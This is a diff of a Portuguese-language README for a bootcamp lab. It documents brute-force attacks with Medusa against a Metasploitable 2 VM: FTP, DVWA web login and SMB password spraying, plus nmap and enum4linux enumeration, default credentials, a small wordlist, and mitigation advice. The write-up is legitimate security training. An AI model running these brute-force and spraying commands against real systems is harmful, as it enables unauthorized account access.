@@ -1,283 +1,381 @@
 # Exercicio
 Exercicio
 
-Desafio DIO - Pentest com Kali Linux e Medusa
-Sobre o Projeto
+# 🔐 Desafio DIO - Ataques de Força Bruta com Kali Linux e Medusa
 
-Este projeto tem como objetivo demonstrar a utilização da ferramenta Medusa em um ambiente controlado para simular ataques de força bruta contra diferentes serviços, compreendendo seus impactos e identificando medidas de mitigação.
+## 📋 Descrição
 
-Os testes foram realizados em laboratório utilizando máquinas virtuais no VirtualBox, sem qualquer interação com sistemas reais ou sem autorização.
+Este projeto tem como objetivo demonstrar a utilização da ferramenta **Medusa** em um ambiente controlado para simular ataques de força bruta contra serviços vulneráveis, utilizando o **Kali Linux** e a máquina vulnerável **Metasploitable 2**.
 
-Objetivos
-Compreender o funcionamento de ataques de força bruta.
-Utilizar o Kali Linux como plataforma de testes.
-Utilizar o Medusa para auditoria de credenciais.
-Explorar serviços vulneráveis em ambiente controlado.
-Documentar processos técnicos.
-Identificar medidas de prevenção.
-Ambiente Utilizado
-Máquina Atacante
-Kali Linux
-Item	ValorSistema Operacional	Kali Linux
-IP	192.168.56.10
-Máquina Alvo
-Metasploitable 2
-Item	ValorSistema Operacional	Metasploitable 2
-IP	192.168.56.20
-Topologia
-Plain Text
-+----------------+
-| Kali Linux |
-| 192.168.56.10 |
-+--------+-------+
-|
-|
-Host-Only Network
-|
-|
-+--------+-------+
-| Metasploitable |
-| 192.168.56.20 |
-+----------------+
-Ferramentas Utilizadas
-Kali Linux
-Medusa
-Nmap
-DVWA
-Metasploitable 2
-VirtualBox
-Etapa 1 - Descoberta de Serviços
+Durante os testes foram explorados cenários de autenticação em serviços FTP, aplicações web (DVWA) e SMB, buscando compreender como ataques de força bruta funcionam e quais medidas podem ser adotadas para mitigá-los.
 
-Inicialmente foi realizado o mapeamento das portas abertas.
+> ⚠️ Todos os testes foram realizados em ambiente de laboratório e possuem finalidade exclusivamente educacional.
 
-Shell
+---
+
+# 🎯 Objetivos
+
+- Compreender ataques de força bruta em diferentes serviços.
+- Utilizar o Kali Linux para auditoria de segurança.
+- Conhecer a ferramenta Medusa.
+- Identificar vulnerabilidades relacionadas a credenciais fracas.
+- Aplicar técnicas de enumeração e validação de acesso.
+- Documentar atividades de pentest de forma organizada.
+
+---
+
+# 🖥️ Ambiente de Laboratório
+
+## Máquina Atacante
+
+**Kali Linux**
+
+| Informação | Valor |
+|------------|--------|
+| Sistema Operacional | Kali Linux |
+| IP | 192.168.56.10 |
+
+---
+
+## Máquina Alvo
+
+**Metasploitable 2**
+
+| Informação | Valor |
+|------------|--------|
+| Sistema Operacional | Metasploitable 2 |
+| IP | 192.168.56.20 |
+
+---
+
+# 🌐 Topologia da Rede
+
+```text
++--------------------+
+| Kali Linux         |
+| 192.168.56.10      |
++---------+----------+
+          |
+          |
+      Host-Only
+          |
+          |
++---------+----------+
+| Metasploitable 2   |
+| 192.168.56.20      |
++--------------------+
+```
+
+---
+
+# 🛠️ Ferramentas Utilizadas
+
+- Kali Linux
+- Medusa
+- Nmap
+- DVWA
+- Metasploitable 2
+- Enum4linux
+- Netcat
+- VirtualBox
+
+---
+
+# 🔍 Descoberta de Serviços
+
+Antes dos testes foi realizado o mapeamento das portas abertas utilizando o Nmap.
+
+```bash
 nmap -sV 192.168.56.20
+```
 
-Resultado esperado:
+### Resultado esperado
 
-Plain Text
-21/tcp open ftp
-22/tcp open ssh
-80/tcp open http
-139/tcp open netbios-ssn
-445/tcp open microsoft-ds
-Cenário 1 - Força Bruta em FTP
-Criação da Wordlist
+```text
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+```
+
+---
+
+# 🚨 Cenário 1 - Força Bruta em FTP
+
+## Criação da Wordlist
 
 Arquivo:
 
-Plain Text
+```text
 wordlist.txt
+```
 
 Conteúdo:
 
-Plain Text
+```text
 123456
 admin
 password
 msfadmin
 toor
 root
-Ataque Utilizando Medusa
+```
 
-Comando:
+---
 
-Shell
+## Execução do Ataque
+
+```bash
 medusa -h 192.168.56.20 -u msfadmin -P wordlist.txt -M ftp
+```
 
-Resultado:
+### Resultado
 
-Plain Text
+```text
 ACCOUNT FOUND:
 Host: 192.168.56.20
 User: msfadmin
 Password: msfadmin
-Validação
+```
 
-Conexão FTP:
+---
 
-Shell
+## Validação do Acesso
+
+```bash
 ftp 192.168.56.20
+```
 
-Login:
-
-Plain Text
+```text
 User: msfadmin
 Password: msfadmin
+```
 
-Acesso obtido com sucesso.
+A autenticação foi realizada com sucesso.
 
-Cenário 2 - Ataque ao DVWA
-Configuração
+---
 
-Acessar:
+# 🌐 Cenário 2 - Ataque ao DVWA
 
-Plain Text
+## Acesso à Aplicação
+
+```text
 http://192.168.56.20/dvwa
+```
 
-Entrar:
+Credenciais padrão:
 
-Plain Text
-admin
-password
+```text
+Usuário: admin
+Senha: password
+```
 
-Configurar nível:
+Configuração:
 
-Plain Text
-Security Level = Low
-Automatizando Tentativas
+```text
+DVWA Security = Low
+```
 
-Exemplo de comando:
+---
 
-Shell
+## Teste de Credenciais
+
+Exemplo:
+
+```bash
 medusa -h 192.168.56.20 -u admin -P wordlist.txt -M http
+```
 
-Objetivo:
+---
 
-Testar múltiplas credenciais.
-Identificar senhas fracas.
-Demonstrar vulnerabilidade de autenticação.
-Resultado
+## Resultado Obtido
 
-Foi possível identificar contas utilizando credenciais previsíveis.
+Foi possível identificar credenciais fracas, como:
 
-Exemplos:
-
-Plain Text
+```text
 admin:password
 admin:admin
-Cenário 3 - Password Spraying SMB
-Enumeração de Usuários
+```
 
-Utilizando enum4linux:
+---
 
-Shell
+# 🖧 Cenário 3 - Password Spraying SMB
+
+## Enumeração de Usuários
+
+```bash
 enum4linux 192.168.56.20
+```
 
-Resultado:
+### Usuários identificados
 
-Plain Text
+```text
 root
 msfadmin
 user
 service
-Password Spraying
+```
 
-Utilizando uma senha comum para vários usuários:
+---
+
+## Criando a Lista de Usuários
 
 Arquivo:
 
-Plain Text
+```text
 usuarios.txt
-Plain Text
+```
+
+Conteúdo:
+
+```text
 root
 msfadmin
 user
 service
+```
 
-Comando:
+---
 
-Shell
+## Password Spraying
+
+Utilizando uma senha comum para todos os usuários:
+
+```bash
 medusa -h 192.168.56.20 -U usuarios.txt -p password -M smbnt
-Resultado
+```
 
-Exemplo:
+---
 
-Plain Text
-ACCOUNT FOUND
+## Resultado
+
+```text
+ACCOUNT FOUND:
 User: user
 Password: password
-Vulnerabilidades Identificadas
-Senhas Fracas
+```
+
+---
+
+# 🔎 Vulnerabilidades Encontradas
+
+## Senhas Fracas
 
 Exemplos:
 
-Plain Text
-password
+```text
 123456
+password
 admin
+```
 
 Impacto:
 
-Acesso não autorizado.
-Escalada de privilégios.
-Vazamento de dados.
-Ausência de Bloqueio de Conta
+- Acesso não autorizado
+- Vazamento de dados
+- Escalada de privilégios
 
-Foi possível realizar diversas tentativas consecutivas sem bloqueio.
+---
 
-Impacto:
+## Credenciais Padrão
 
-Facilita ataques automatizados.
-Contas Padrão
+Exemplos:
 
-Credenciais padrão presentes:
-
-Plain Text
+```text
 admin:password
 msfadmin:msfadmin
+```
 
 Impacto:
 
-Comprometimento imediato.
-Mitigações Recomendadas
-Política de Senhas Fortes
+- Comprometimento imediato do serviço
+
+---
+
+## Ausência de Bloqueio de Conta
+
+Foi possível realizar diversas tentativas consecutivas de autenticação.
+
+Impacto:
+
+- Facilita ataques automatizados de força bruta
+
+---
+
+# ✅ Recomendações de Mitigação
+
+## Política de Senhas Fortes
+
+Requisitos mínimos:
+
+- 12 caracteres ou mais
+- Letras maiúsculas
+- Letras minúsculas
+- Números
+- Caracteres especiais
+
+---
+
+## Implementação de MFA
 
 Exemplo:
 
-✅ Mínimo 12 caracteres
-
-✅ Letras maiúsculas
-
-✅ Letras minúsculas
-
-✅ Números
-
-✅ Caracteres especiais
-
-MFA
-
-Implementar autenticação multifator:
-
-Plain Text
+```text
 Senha + Aplicativo Autenticador
-Bloqueio de Conta
+```
+
+---
+
+## Bloqueio de Conta
 
 Exemplo:
 
-Plain Text
-5 tentativas incorretas
+```text
+5 tentativas inválidas
 ↓
 Conta bloqueada por 15 minutos
-Monitoramento
+```
 
-Registrar:
+---
 
-Tentativas de login.
-Endereços IP.
-Horários.
-Serviços acessados.
-Remover Credenciais Padrão
+## Monitoramento de Logs
 
-Trocar imediatamente:
+Monitorar:
 
-Plain Text
+- Tentativas de login
+- Endereços IP
+- Horários de acesso
+- Eventos de autenticação
+
+---
+
+## Remoção de Credenciais Padrão
+
+Alterar imediatamente:
+
+```text
 admin/admin
 root/root
 password/password
-Lições Aprendidas
+```
 
-Durante a execução deste laboratório foi possível observar como senhas fracas representam um dos maiores riscos para a segurança da informação.
+---
 
-A utilização do Medusa simplifica a execução de auditorias de autenticação e demonstra como atacantes podem automatizar milhares de tentativas em poucos minutos.
+# 📚 Aprendizados
 
-Também foi possível entender a importância de:
+Durante a execução deste laboratório foi possível compreender:
 
-MFA;
-Senhas robustas;
-Monitoramento contínuo;
-Políticas de bloqueio de conta;
-Revisão periódica de credenciais.
-Conclusão
+- O funcionamento dos ataques de força bruta.
+- A utilização do Medusa para auditoria de credenciais.
+- A importância da enumeração na coleta de informações.
+- Os riscos associados a senhas fracas.
+- A efetividade de mecanismos de proteção como MFA e bloqueio de contas.
 
-Este projeto permitiu compreender na prática o funcionamento de ataques de força bruta utilizando o Kali Linux e o Medusa em um ambiente seguro. A atividade demonstrou que a combinação de senhas fracas, credenciais padrão e ausência de controles de proteção pode resultar em comprometimento total de sistemas e serviços.
+---
+
+# ✅ Conclusão
+
+A realização deste desafio permitiu compreender na prática como ataques de força bruta podem comprometer serviços expostos quando não existem mecanismos adequados de proteção.
+
+A utilização do Kali Linux e do Medusa demonstrou como atacantes podem automatizar grandes volumes de tentativas de autenticação, reforçando a importância da adoção de boas práticas de segurança, políticas de senha fortes, autenticação multifator e monitoramento contínuo dos ambientes.
